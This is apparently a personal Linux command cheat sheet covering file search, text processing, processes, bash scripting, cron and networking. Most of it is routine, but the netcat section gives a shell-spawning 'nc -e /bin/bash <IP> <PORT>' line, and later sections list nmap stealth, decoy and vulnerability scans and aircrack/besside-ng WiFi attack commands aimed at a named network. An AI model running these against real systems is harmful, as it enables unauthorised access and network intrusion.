# Linux Commands

## Get system info

`uname` return some useful information about the specific flavor of the OS and its kernel.

```bash
# -a for all information
uname -a 
```

## Create link

```bash
ln -s /root/B/publicB.pem
```

## ls

```bash
# Reverse sort based on time and in long human readable format
ls -ltrh

# Show recursively
ls -R
```

## Find

`find` shows everything in current directory

```bash
find .
```

Here are some more useful commands and switches.

```bash
# Files that their name's are exactly "test"
find . -name 'test'

# Files that have flag (ignore-case) in their names
find . -iname '*flag*'
```

### Based on type

```bash
# Search only between directories -type {d,f,l}
find . -iname '*flag*' -type d
```

### Based on size 

```bash
# Set condition on file's size
find /var -iname '*tmp*' -size +1M -100M
```

### Based on time

First part

- `a` - Access
- `c` - Status (like permission)
- `m` - Modify (Content)

Second part

- `min` - Minutes
- `time` - 24 Hour

```bash
# Files that have been modified under ./ in recent 30 minutes.
find . -mmin -30
```

### Execute on the files

```bash
find . -mmin -3 -exec echo "this is file {}" \;
find . -mmin -3 -exec ls "{}" \;

# Important operations have their own switch
find . -mmin -3 -ls
find . -mmin -3 -delete
```

## Locate

```bash
sudo apt install mlocate
locate <FILE_NAME<
````

## Alias

```bash
'alias ll='ls -lh'
```

## grep

To search in the content of a file.

```bash
# Search a word in file
grep <WORD> <FILE>

# Search in all files and contents
grep -r flag *

# For non-sensetive
grep -i

# To exclude a word use -v 
grep -v something

# To show before and after a grep
cat something.txt | grep -B 5 -A 5 something

# Search between all files in current directory
# using regular expression and with line number.
grep -r -n -e ".*"  ./*

# Show the count 
grep -c funk words_alpha.txt

# Show all of the file names that contains the regex
grep -lr funk .

# grep this regex in all txt files
grep a *.txt
```

## egrep

`egrep` is an extended grep. It is equal to `grep -E`.

## Binaries

```bash
# To see human readble strings in binary files
strings <BINARY_FILE>
```

## lsblk

Show all of blocks

```bash
lsblk
```

## fdisk

Show all of the partitions of a disk

```bash
# List all of partitions
fdisk /dev/sda -l
```

Start partitioning

```bash
fdisk /dev/sda
```

## mkfs

```bash
# Formatting to ex3 
mkfs -t ext3 /dev/sda1
# Calling /sbin/mkfs.ext3
mkfs.ext3 /dev/sda1
```

## mkswap

```bash
# Create a swap area
mkswap /dev/sda5
```

## blkid

```bash
# Get the UUID of a partition
blkid /dev/sda1
```

## List folders sizes

Sort files based on their sizes:

```bash
ll -hrl | sort -k 5n
```

##  df

Disk Storage Status (Disk free).

```bash
# Human readable
df -h

# Show the type of the filesystem
df -hT

# Show the status of iNode
df -i
```

## du

Disk Usage

```bash
# Print the usage of all files in the current directory
du -h

# Show the summary of disk usage in the root
du / -h -s
```

If you want to be more specific

```bash
# Calculate with a specific depth
du -h --max-depth 1
```

If you want to sort them, you can use the `sort` command.

```bash
du -hs * | sort -h
```

## fsck

Filesystem Check

```bash
fsck /dev/sda5

# Check everything that is necessary
fsck -A

# Do not execute anything
fsck -N
# Ask me each time
fsck -i
```

To see where are the current partitions you can see `/etc/fstab`.

## tune2fs

Get full information about a disk.

```bash
tune2fs -l /dev/sda5
```

## xfs

```bash
xfs_info

# Organizing the blocks
xfs_fsr
```

### ncdu 

An alternative for the `du` is the `ncdu`:
 
```bash
ncdu
```

## Common tricks

To check if a bash script is correct or not without running it:

```bash
bash -n <script>
```

Use -p flag when you want to create nested folders. For example:

```bash
mkdir -p a/b/c/d/e/f/g
```

To calculate the duration of a command

```matlab
time <YOUR_COMMMAND>
```

Copy multiple files in a specific location

```bash
sudo cp /tmp/{server.crt,ca.crt} /etc/openvpn/
```

Using `tee` you can save log of your commands

```bash
echo "amin" | tee test.log
```

To see the difference between two file just use 

```bash
diff FILE1 FILE2
```

To go to the previous directory

```bash
cd /etc
cd /var
# To go to the /etc again
# You can also use pushd and pod
# To go to previous path
cd -
```

Minimizing an app like vim into background

```bash
# To minimize app (background)
^Z 
# To go back to foreground again
fg
```

Run the most recent command

```bash
# Repeat the most recent command with sudo
sudo !!

# Run the most recent command that had `ping`
!ping
```

Run a command from the history. You can use the number to run it again.

```bash
# Show histories
history

# Execute the id=120
!120
```

To check whether the command is available or not.

```bash
if ! command -v <the_command> &> /dev/null
then
    echo "<the_command> could not be found"
    exit
fi
```

## Tree the folders 2 levels

```bash
tree -L 2 .
```

## Install DPKG dependencies

```bash
# First, install the DPKG
sudo dpkg -i package_with_unsatisfied_dependencies.deb

# Run this command to satisfy the dependencies
apt-get -f install
```

## Environment variables

Import environment variables from a file.

`set -a` causes variables defined from now on to be automatically exported. It's available in any Bourne-like shell. `.` is the standard and Bourne name for the `source` command so I prefer it for portability (`source` comes from `csh` and is now available in most modern Bourne-like shells including `bash` though (sometimes with a slightly different behavior)).

```bash
set -a
source ./tmp.txt
set +a
```

You can create a template file like bellow

```bash
Package: SPCU-Client
Version: $VERSION
Architecture: armhf
Maintainer: SPCUINC <Admin@spcuinc.com>
Description: A program managing IoT devices.
```

Then you can replace the environment variables to generate a new config file.

```bash
envsubst < "configs/control" > "build/spcu_client_1.0.0-1_armhf/DEBIAN/control"
```

When you want to use a default value for your env variable:

```bash
# Use the PGADMIN_DEFAULT_EMAIL variable or use "amin" if it is not set.` 
echo ${PGADMIN_DEFAULT_EMAIL:-amin}
```

You can use `source` command to execute a bash script for the running terminal session.

```bash
source my_bash_script.sh
```

## rsync

```bash
# Verbose and archive mode
rsync -av /Volume/example .

# Simulate the rsync
rsync -av --dry-run --progress /Volume/example .

# With the progress bar
rsync -av --progress /Volume/example .

# To another server
rsync -av --progress /Volume/example root@139.177.195.158:
```

## xarg

It can take the output of a command and passes it as an argument for another command.

```bash
# To convert the muti-line output from ls command into a single line
ls | xargs
ls | xargs wc

# It's more flexiable to 
echo "hi there" | xargs -I DATA echo hi DATA there!

# Change xargs to expect NUL (``\0'') characters as separators
# Find & remove all directories with a special word
find Downloads -name "flag" -type d -print0 | xargs -0 /bin/rm -v -rf "{}"
```

## tee

```bash
# It also print on the stdout
ls -1 | tee allfiles myfiles
```

## SSH

You can use `ssh` to receive an interactive shell from another computer. 

You can also use port forwarding

```bash
# Port forwarding
# -f is used for running in background
# -L is for binding 
# -N not execute a remote command
ssh -N -f -L 8080:localhost:8080 ubuntu@os-playground1
```

## SCP

You can use `scp` command to send files in terminal to other computers.

## Screen

You may want to execute a long-running job on your virtual machine. The network connection can interrupt your ssh connection, and you lose the running task session in your terminal. In this situation, you can use something like Tmux.
Another tool is called Screen. 

```bash
# To create a new session with name
screen -S session_name

# To detach
# Press ^a + d

# List the sessions
screen -ls

# To restore a session
screen -r 51166
```

> You can customize your screen in `~/.screenrc` file.

At last, I think using tmux is better :))

## User Management

To create a separate home directory for user

```bash
mkhomedir_helper <USER>
```

To create a specific directory for the user when you are creating the user

```bash
useradd -m -d /home/user1 user1

# To add user 
useradd user1
# To remove user
userdel user1
```

Remove the password for a user

```bash
passwd -d user1
```

## Group Management

To create or remove a new group

```bash
groupadd shared
groupdel shared
```

To add a user to a new group you can use 

```bash
usermod -a -G shared user1
```

To see user groups

```bash
cat /etc/group
```

![Untitled](Linux%20Commands/Untitled.png)

## chgrp

To change group owner ship

```bash
# Change group of /u to staff
chgrp staff /u
# + With subfolders (recursively)
chgrp -hR staff /u
```

## chmod

It restricts the way a file can be accessed.

```bash
# chmod options permissions file name

# the user can read, write, and execute it;
# members of your group can read and execute it; and
# others may only read it.
chmod u=rwx,g=rx,o=r myfile
chmod 754 myfile

# To change the mod of files or directories
find /var/www/html -type f -exec chmod u=rw,go=r {} \;
```

The operator **+** causes the selected file mode bits to be added to the existing file mode bits of each file; **** causes them to be removed; and **=** causes them to be added and causes unmentioned bits to be removed except that a directory's unmentioned set user and group ID bits are not affected.

## chown

To change owner of the directory or file

```bash
chown -R user1 /shared_files
```

## Watch

You can use `watch` command to watch the output of your command periodically.

```bash
# Default is 2 seconds
watch uptime

watch -n 1  "ls -lhf | grep Huawei | awk '{print \$5}'"

# Highlight the differences
watch -n 1 -d uptime

# Make sound if it has a non zero exit
watch -n 1 ./run
```

## Cat

A tool to concatinate input streams.

```bash
cat a.txt b.txt
```

> You can use `zcat`, `gzcat`, etc., to concatinate compressed files.
>    

## Od

It shows files in formats other than text.

```bash
od t.txt

# To show readable characters
od -c t.txt
```

## Split

You can split a big file to some smaller files using `split` command.

```bash
# -b for size
# -l for lines
# -n for chunks
split -n  10 h.zip h_ 
```

## Nl

Add line number to the input text.

```bash
nl t.txt

# You can use other commands too
cat -n t.txt
```

## Sed

It is a command used for replacing and editing strings. For instance, look at this text:

```
# text.txt file
unix is great os. linux is opensource. unix is free os.
learn operating system.
unix linux which one you choose.
unix is easy to learn.linux is a multiuser os.Learn unix .unix is a powerful.
```

You can replace all of UNIX works to Linux by this command:

```bash
# `s` is for substitution
# First one is the word going to be substituted
# The second word is the new work
# There are bunch of flags like g that means global.
# You can use `2` for changing the second occurnance.
sed 's/unix/linux/g' geekfile.txt
```

### To show specific lines of a file

To get number of lines you can use

```bash
# Get line 2 to 10
# Docs for `-n`: By default, each line of input is echoed to the standard output after all of the commands have been applied to it
sed -n '2,10p'

# Get line 2 and 10 
sed -n '2p;10p'
```

## WC

To get the number of lines

```bash
# Word count
# [paragraphs] [words] [characters]
wc t.txt

# To get number of lines
wc -l docker-compose-dev.yml 
```

## Hashing

```bash
md5sum file.txt
sha256sum file.txt
sha512sum file.txt
```

## AWK

```bash
# To get the first column of output
# which is separated by spaces.
awk -F ' ' '{print $1}'

# To print the exact previous output
awk '{print $0}' t.txt
```

## Cut

As it seems, It will cut the output as we want to.

```bash
# Let's assume we have a table and we want to cut them word by word and show the seconds words
minikube status | cut -w -f2

# Or you can deliminate the letter
# f2 shows the seconds part in each line 
minikube status | cut -d " " -f2

# field 1,2 and 4,5,6
minikube status | cut -d " " -f1,2,4-6
```

## Head

```bash
# To get the 20 first character of a file
cat file | head --bytes 20
```

## Sort

It sorts the input text string by different kinds of factors.

```bash
# If you want to sort a file in which a line has a number at the beginning.
sort -n the_file.txt
```

## Unique

```bash
# To get the unique output
uniq t.txt

# To count each one of them
uniq -c t.txt

# To find words that are unique along the entire file.
uniq -u t.txt
```

> The `unique` can operate on files that have been sorted already.
> 

## Paste

It merges the lines of the given files.

```bash
paste a.txt b.txt c.txt
```

## Tr

It translates the characters to another character.

```bash
cat file.txt | tr '123456789' '۱۳۴۵۶۷۸۹۰'
```

## Touch

```bash
# To create new empty file 
touch myfile.txt

# To change the time of the file (You can set -t for timestamp)
touch -t 200908121510.32

# Use reference with -r
touch -r /etc/debian_version myfile.txt
```

## File 

Windows files have an extention which specifies the type of the file. This is not safe because everybody can change the extention. In Linux, There is no `*.extention`.

```bash
# To get the type of the file
file filename.txt
```

## dd

It is a more advanced copy.

```bash
# To copy 100 1 byte block size from /dev/zero and put it in newfile
# You can test the result with `od` command
dd if=/dev/zero of=newfile count=100 bs=1
```

## Process management

### nice

It run a command with a specific niceness. 

```bash
# Show the default niceness
nice 

# Run ls with niceness 10
nice ls

# Run ls with niceness 14
nice -n 14 ls

# Run ls with niceness -14
sudo nice -n -14 ls
```

**Notice:** non-root user can not set negative niceness for their tasks.

### renice

It changes the niceness of a process.

```bash
renice -n 57890
```

# Compression

## gzip

```bash
# To compress a file 
gzip you_file.txt

# To list details including the compress percentage
gzip -l you_file.txt.gz

# To uncompress
gzip -d you_file.txt.gz
gunzip file.gz
```

You can use gzip in `tar` command. To compress a directory with multiple files

```bash
# -z for gzip
tar -czvf files.gz files/
```

## Tar

`tar` is used for archiveing multiple files.

> ⚠️ You don't need to type `-` for switches.

### Create a new tar file

```bash
tar cf mytarfile.tar a.txt b.txt c.txt 
```

You can compress the give files while creating a new tar file.

- `z` - gzip
- `b` - bzip2

```bash
tar cfz mytarfile.tar.gzip a.txt b.txt c.txt
```

> ✍️ The `-r` option appends new files to the current available archive.

### Extract a tar file

To extract a `tar.gz` file, use the --extract (`-x`) option and specify the archive file name after the f option:

```bash
tar -xf archive.tar.gz
tar xf archive.tar.gz
```

> ✍️ The `-v` option will make the tar command more visible and print the names of the files being extracted on the terminal.

By default, tar will extract the archive contents in the current working directory. Use the `--directory` (`-C`) to extract archive files in a specific directory:

```bash
tar -xf archive.tar.gz -C /home/linuxize/files
```

When extracting files, you must provide their exact names, including the path, as printed by `--list` (`-t`).

Extracting one or more directories from an archive is the same as extracting files:

```bash
tar -xf archive.tar.gz dir1 dir2Copy
```

## cpio

```bash
# To create
ls | cpio -o > thefile.cpio

# To open the file
cpio -id < thefile.cpio
```



## lsof

```bash
# To print processes on the port 8080
lsof -i:8080
```

## ps

It's a flexible too for identifying programs running on the system.

```bash
# Show the processes
ps

# All Linux processes
ps -e

# Full information of processes
ps -ef 
ps -Af

# Show resources dedicated to the processes
ps -aux
```

### pgrep

To find a process between running processes

```bash
ps | grep eyes
pgrep eyes

# Kill all eyes processes
pgrep eyes | xargs kill
```

## Kill a process

```bash
sudo kill -9 423

# To kill a process on a specific port
sudo kill -9 $(sudo lsof -t -i:3000)
lsof -ti:8080 | xargs kill -9

# Kill all processes whose command is exactly `xeyes`
killall xeyes
# Kill all process that have a kind of command
pkill xeye
```

## Strace

If all you want to do is spy on the existing process, you can use `strace`.

```bash
# To see only data written to file descriptor 3 (`-e trace=` prevents the system calls from being loged).
strace -p1234 -e trace= -e write=3
```

## Jobs

```bash
# For see the procecess in the current session
# Jobs with `&` at the end mean running in background
jobs

# With process id
jobs -l
```

## Fg

To resume a job or process in the foreground

```bash
# Resume the last process (consider the `+` sign)
fg 

# Choose between multiple processes
fg %2
```

## Bg

To resume a job in the background

```bash
# Resume the last process (consider the `+` sign)
bg 

# Choose between multiple processes
bg %2
```

## Nohup

These foreground and background process are alive until the session is closed. If you want to keep them alive even if the parent are killed, you need to use `nohup`.

```bash
nohup xeyes
```

## Curl

For a get request:

```bash
curl -X GET <URL>
curl -i -H "Accept: application/json" -H "Content-Type: application/json" -X GET http://hostname/resource
```

To beautify the response you can:

```bash
echo $(curl -X GET http://localhost:8000/revert/minio/3/) | python -m json.tool
```

To pass data to the curl

```bash
curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data
```

You can also send a file using curl

```bash
curl -F 'uploadFile=@./xs.PNG' http://localhost:8080/upload
```

To send a gzip file with curl

```bash
curl -i -XPOST localhost:8080/orgs/8395a239-d09f-4427-927a-614022239859/devices/f365fbb2-56bf-4b4f-95e3-23cd1c9fc88a/apps/runner/logs -H'Content-Encoding : gzip' --data-binary @sentlog.gz
```

To get the status code from the curl you can use

```bash
status_code=$(curl -o /dev/null -s -w "%{http_code}" $1)
echo $status_code
```

You can pipe curl with `json_pp` to make it better

```bash
curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data | json_pp
```

To pass a cookie

```bash
curl -XGET --cookie "PHPSESSID=dgtvr4ef7k3jnm8bfmiobo9vm5" https://typhooncon-knowme.chals.io
```

To download a file

```bash
curl <FILE_URL> --output filename.jpg
```

## APT

You can edit the resources in this list. `/etc/apt/sources.list` and in any file with the suffix .list under the directory like `/etc/apt/sources.list.d/`

## Binwalk

Check the binary file to see if it is consisted of multiple binaries or not.

```bash
binwalk f.png
```

## Convert

To resize an image

```bash
# Resize
convert temp.png -resize x200 temp.png
```

## Magick

```bash
# To create new pictures or glue them to gether
magick montage -tile x1 -title "some title"  top.png
magick montage  -tile x4 -title "another one" temp.png bottom.png

# Glue them
magick montage -tile 1x top.png bottom.png -mode Concatenate
```

# Script

## Input

```bash
echo "What is your name?"
read name
# Read with a message
read -p "Enter the number: " num
# Read secure
read -sp "Enter the password: " num
# More variables
read name1 name2 name3 name4 name5
```

## Using basic operators

To increase a variable

```bash
i=0
i=$((i+1)) # i=1
```

## Conditions

```bash
read coffee
if [[ $coffee == "y" ]]; then
    echo "You're awesome."
elif [[ $USER == "bernard" ]]; then
    echo "Bernard always win this game."
else
    echo "Do nothing."
fi
```

Condition on file existence.

```bash
# File existance
if [ -r /var/the/file ]; then
    echo "It exists."
fi
```

## Switches

```bash
read class
case $class in
    1)
        type="A"
        ;;
    2)
        type="A"
        ;;
    3)
        type="A"
        ;;
esac
```

## For 

```bash
for index in 0 1 2 3 4; do
	newarr[$index]=${originalarr[4-$index]}
done

# Range of numbers
for index in {0..10}; do
	newarr[$index]=${originalarr[4-$index]}
done

# Or it can be some strings
for name in ; google.com facebook.com bing.com do
	ping $name
done

# Read from file
for index in $(cat cities.txt); do
	newarr[$index]=${originalarr[4-$index]}
done
```

## While

```bash
# While status code is not 200 continue to making requests
status_code=0
i=0
while [ $status_code -ne 200 ]
do
	status_code=$(curl -o /dev/null -s -w "%{http_code}" $1)
	echo "ret is: [$status_code]"
	((i ++))
done

# Loop through the lines of a file
while read p; do
  echo "$p"
done <peptides.txt

# To loop through lines of a command result
sudo docker container ls -a | grep pg | awk '{print $1}' | while read c; do
    sudo docker container rm -f $c
done
```

## Functions

```bash
function functionName() {
    # code
}

secondFunction() {
    # code
}
```

## Select 

```bash
choice="encrypt decrypt"
select option in $choice; do
	if [ $REPLY = 1 ]; then
		echo "Using encrypt"
	elif [ $REPLY = 2 ]; then
		echo "Using dencrypt"
	fi
done

# Output
# 1) encrypt
# 2) decrypt
# #? 1
# Using encrypt
# #? 2
# Using dencrypt
	
```

## Functions

```bash
read -p "Enter the number: " num

# Factorial
print_factorial() {
        counter=$1
        factorial=1
        while [ $counter -gt 0 ]; do
                factorial=$(( factorial * counter ))
                counter=$(( counter - 1 ))
        done
        echo "Factorial: " $factorial
}


# Aggregation
print_aggregation() {
        counter=$1
        aggr=0
        while [ $counter -gt 0 ]; do
                aggr=$(( aggr + counter))
                counter=$(( counter - 1 ))
        done
        echo "Aggregation: " $aggr
}

print_factorial $num 
print_aggregation $num 

```

## Arrays

```bash
# Create new array
newarr=()

# Read and save to an array
read -p "Enter 5 names: " name1 name2 name3 name4 name5
originalarr=($name1 $name2 $name3 $name4 $name5)

# Read and assign values
for index in 0 1 2 3 4; do
	newarr[$index]=${originalarr[4-$index]}
done

# Print everything inside an array
echo ${newarr[*]}
```

## Tips

To check the exit code and status of the last executed command.

```bash
if [ $? -eq 0 ]
then
  echo "Successfully created file"
else
  echo "Could not create file" >&2
  exit 1
fi
```

# Cron

## Basic syntax

***Cron*** reads the configuration files for a list of commands to execute. The daemon uses a specific syntax to interpret the lines in the ***crontab*** configuration tables.

To be able to set up a cron job, we need to understand the basic elements that make up this syntax. The standard form for a crontab line is as follows:

```bash
a b c d e /directory/command output

# Another pattern naming
MIN HOUR DOM MON DOW CMD
# MIN	Minute field	0 to 59
# HOUR	Hour field	0 to 23
# DOM	Day of Month	1-31
# MON	Month field	1-12
# DOW	Day Of Week	0-6
# CMD	Command	Any command to be executed
```

1. The first five fields **`a b c d e`** specify the time/date and recurrence of the job. See the table for further information.  [https://phoenixnap.com/kb/set-up-cron-job-linux](https://phoenixnap.com/kb/set-up-cron-job-linux)

2. In the second section, the **`/directory/command`** specifies the location and script you want to run.

3. The final segment **`output`** is optional. It defines how the system notifies the user of the job completion.

For example, if I want to run the script `run.sh`:

```bash
# Open the configuration file
crontab -e

# Add the line to the file
# It will run the script each miniute
# The current path that runs the script is /home/<username>
# The third option is optional and gathers the output in a file
* * * * * /home/ubuntu/cron/run.sh /home/ubuntu/cron/
```

## Special characters

For efficiency, cron syntax also uses operators. Operators are special characters that perform operations on the provided values in the cron field.

- **An asterisk (*)** stands for all values. Use this operator to keep tasks running during all months, or all days of the week.
- **A comma (,)** specifies separate individual values.
- **A dash (–)** indicates a range of values.
- **A forward-slash (/)** is used to divide a value into steps. (*/2 would be every other value, */3 would be every third, */10 would be every tenth, etc.)

### Time Special values

[https://www.thegeekstuff.com/2009/06/15-practical-crontab-examples/](https://www.thegeekstuff.com/2009/06/15-practical-crontab-examples/)

```bash
# Keyword	Equivalent
# @yearly	0 0 1 1 *
# @daily	0 0 * * *
# @hourly	0 * * * *
# @reboot	Run at startup.
# For example
@yearly /home/ramesh/red-hat/bin/annual-maintenance
```

## Set Cron job for another user

```bash
crontab –u other_username –e
```

## ulimit

`ulimit` is a built-in Linux shell command that allows viewing or limiting system resource amounts that individual users consume. Limiting resource usage is valuable in environments with multiple users and system performance issues.

```bash
# prints all of the user limits
ulimit -a
```

There are 2 types of resource limitation: “hard” and “soft”. Hard resource limit defines the physical limit that the user can reach. The “soft” resource limit is manageable by the user. Its value can go up to the “hard” limit.

The system resources are defined in `cat /etc/security/limits.conf`.

# Network

## IP Address

To get local IP addresses:

```bash
ifconfig
en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	options=400<CHANNEL_IO>
	ether 38:f9:d3:50:53:4f
	inet6 fe80::cd8:50d:9fda:6cfc%en0 prefixlen 64 secured scopeid 0x4
	inet 192.168.1.3 netmask 0xffffff00 broadcast 192.168.1.255
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active

arp -a 
? (192.168.1.1) at e0:1c:fc:6:a4:5c on en0 ifscope [ethernet]
? (192.168.1.3) at 38:f9:d3:50:53:4f on en0 ifscope permanent [ethernet]
? (192.168.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]
? (239.255.255.250) at 1:0:5e:7f:ff:fa on en0 ifscope permanent [ethernet]
```

### Search all of the active IP Addresses

```bash
# Install the arp-scan
sudo apt-get install arp-scan

# Scan the local IP addresses in network
sudo arp-scan --interface=eth0 --localnet
```

## Ports

To see the ports you can use this command in Linux

```bash
less /etc/services
```

## Wifi

```bash
iwconfig

sudo iwlist <INTERFACE> scan | grep ESSID

# To connect 
wpa_passphrase <YOUR-ESSID> <YOUR-PASS> | sudo tee /etc/wpa_supplicant.conf
sudo wpa_supplicant -c /etc/wpa_supplicant.conf -i wlp4s0
```

- [x] ## Block a server

Sometimes you may need to block the connection with specific servers. The file `/etc/hosts` is the one gathering information. If you want to block a server you should add lines to this file.

```bash
# First open the file
sudo vim /etc/hosts
```

To block them

```
# Then Add these lines
0.0.0.0   www.example.com
0.0.0.0   example.com
::0       www.example.com
::0       example.com
```

## Add a domain name system

### Name Resolution

Open the `/etc/hosts` and add the name and IP address.

```python
192.168.1.11	db
# You can handle the subdomain too
# For example for mycompany.com or prod.company.com
search 			mycompany.com	prod.mycompany.com
```

This mapping is called name resolution.

### DNS Server

Name Resolution is an old solution for handling the domain name system. We use some DNS servers with all of these domain names and IP addresses.

To add a dns server, change the `/etc/hosts`.

```python
nameserver		192.168.1.100
# You can add more.
# You can also set this on your DNS server
# to forward other names to a global DNS server
nameserver		8.8.8.8
```

Still, the local configuration has a higher priority than the DNS server.

## Set static IP addresses

There are some interfaces. You can change each interface using this command:

```bash
ifconfig <interface> <IP_Address> netmask <Netmask> up
```

For example, it could be like this:

```bash
ifconfig wlan0 192.168.1.5 netmask 255.255.255.0 up
```

To set the default gateway IP:

```bash
route add default gw <IP_Address>
```

## Net Cat - `nc`

It is a TCP/IP swiss army knife.

To install the `nc` command you need to install `netcat`

```bash
# Install the netcat
sudo apt install netcat
```

To listen to a specific port

```bash
nc -l -p <PORT> -v
nc -lpv <PORT> -n <IP> # Did not worked the last time.
nc -zvw10 192.168.0.1 22
```

`-l` is for listen.

`-p` is for port.

`-n` is for IP address.

`-v` is for verbose.

To connect to a listening port

```bash
nc -e /bin/bash <IP> <PORT>
```

Checking ports

```bash
# nc -v -n -z -w1 <DomainName> <StartPortNo-EndPortNo>
# For instance, in our example, we had the following:
nc -v -n -z w1 192.168.133.128 1-100

# Listen to UDP
nc -u <IP> <PORT>
```

## Net Stat

```bash
# Show all of the connections
netstat -na
netstat -tulpn
```

## FTP

You can transfer your files using FTP

```bash
ftp <IP_ADDRESS>
```

## Telnet

To connect to a TCP connection.

```bash
telnet <HOST> <PORT>
```

## Ipcalc

To calculate the ip address bits and patterns

```bash
ipcalc <IP_ADDRESS>
```

## nmap

To discover once

```bash
nmap -sL ip.txt
```

To check all of ports in all of the range of these ip

```bash
nmap 192.168.1.0/24
```

Use `nmap` to check alive hosts instead of using lots of `ping`

```bash
nmap -sP 10.7.1.0/24
```

Look for open ports in these range of hosts

```bash
# -T for TCP
sudo nmap -sT -p 80,443 10.7.1.0/24
# -S for Stealthy, SYN Scan, Half open
sudo nmap -sS -p 90,443 10.7.1.0/24
# To open top 1000 ports on a specific host
sudo nmap -sT 10.7.1.226
```

To check target OS

```bash
sudo nmap -O 10.7.1.226
# Aggressive mode, Lots of information about
sudo nmap -A 10.7.1.226
```

Using decoy

```bash
# Duplicate the traffics for another IP address
sudo nmap -sS -D 10.7.1.80 10.7.1.226
```

Check vulnerability by scripts

```bash
# Check vulnhub.com
sudo nmap --script vuln 10.7.1.226
```

```bash
nmap -sC -sV -oN nmap/initial <IP>
```

Not discovered the services? (Maybe it is because of firewall)

```bash
# Service scan, UDP Scan, Drop initial ping
nmap -sS sU -PN 192.168.0.1
```

## IP tables

```bash
# See the firewall rules (actually the name is netfilter)
iptables -L
# To show them fast use -n and -v for more information
iptables -L -n -v

# To add a new rule
# To block an IP address
iptables -A INPUT -s <SOURCE_IP> -j DROP

# To block a TCP port
iptables -A INPUT -p tcp --dport 3200 -j DROP 
```

## DNS file `resolv.conf`

The `/etc/resolv.conf` configuration file contains information that allows a computer to convert alpha-numeric domain names into numeric IP addresses.

The process of converting domain names to IP addresses is called **resolving**.

> When using DHCP, **`dhclient`** usually rewrites **`resolv.conf`** with information received from the DHCP server.

There are three main configuration directives in `/etc/resolv.conf`:

```
nameserver # DNS server IP
domain # Domain Name of local host
search # Which Domain to search
```

### Nameserver

The `nameserver` directive points out to the IP address of a Name Server.

```
nameserver <IP address>
```

It can be your own Name Server, some [public Name Server](https://www.shellhacks.com/en/Free-Fast-Public-DNS-Servers), or the Name Server of your’s ISP.

> Note: Up to 3 name servers may be listed.

Example:

```
nameserver 192.168.0.100
nameserver 8.8.8.8
nameserver 8.8.4.4
```

### Domain

Local domain name.

```
domain <local domain name>
```

Example:

```
domain domain.com
nameserver 192.168.0.100
nameserver 8.8.4.4
```

How does the “domain” directive in the `resolv.conf` file works?

You can use `domain` directives for resolving short host-names – e.g. `test`. So if you have the following in your `/etc/resolv.conf`:

```
domain example.com
```

Then your computer will try to resolve `test.example.com`.

### Search

Search list for hostname lookup. The search list is normally determined from the local domain name but it can be set to a list of domains.

```
search <search list>
```

Example:

```
search example.com company.net
nameserver 192.168.0.100
nameserver 8.8.8.8
```

How does the “search” directive in the `resolv.conf` file works?

You need to use `search` directive for resolving short host-names – e.g. `test`. So if you have the following in your `/etc/resolv.conf`:

```
search example.com company.net
```

Then your computer will try to resolve `test.example.com` followed by `test.company.net`. It will return the first query that was successful.

### Records

- A Record: Mapping a IPv4 to host names.
- AAAA Record: Mapping a IPv6 to host names.
- CNAME Record: Mapping a host name to other host names.

### nslookup

The `nslookup` tool does not consider the local configurations for the DNS, It just look at the DNS server.

```python
nslookup
> google.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	google.com
Address: 142.250.179.174
Name:	google.com
Address: 2a00:1450:400e:802::200e
```

## dig

It returns more details.

```python
dig google.com

; <<>> DiG 9.16.1-Ubuntu <<>> google.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 28637
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;google.com.			IN	A

;; ANSWER SECTION:
google.com.		200	IN	A	142.250.179.174

;; Query time: 0 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Fri May 20 02:32:56 +0430 2022
;; MSG SIZE  rcvd: 55
```

## Aircrack

Start monitoring

```bash
airmon-ng start wlan0
```

Start sniffing the packets

```bash
airodump-ng  wlan0mon
```

```bash
aireplay-ng --test wlan0mon
```

```bash
besside-ng wlan0mon -R Irancell-TD-9283727
```

# Fantasy packages

## Figlet

You can use Figlet to print fantasy text arts.

```bash
# Install
sudo apt install figlet

# Print some text using align and width
figlet -w 100 -c Amin-MAG

# Print center of the current terminal
figlet -t -c Amin-MAG

# Read from file and print with space
figlet -ktp < child.txt

# To use custom fonts located in /usr/share/figlet
```

## Toilet

```bash
# Install 
sudo apt install toilet

# Print basic text
toilet -k Amin-MAG
```

# Third-Party Packages

## Termgraph

```bash
# Installation 
python3 -m pip install termgraph

# A simple graph
cat file | sort | uniq -c | awk '{print $2 " " $1}' | termgraph 
```

# Resources

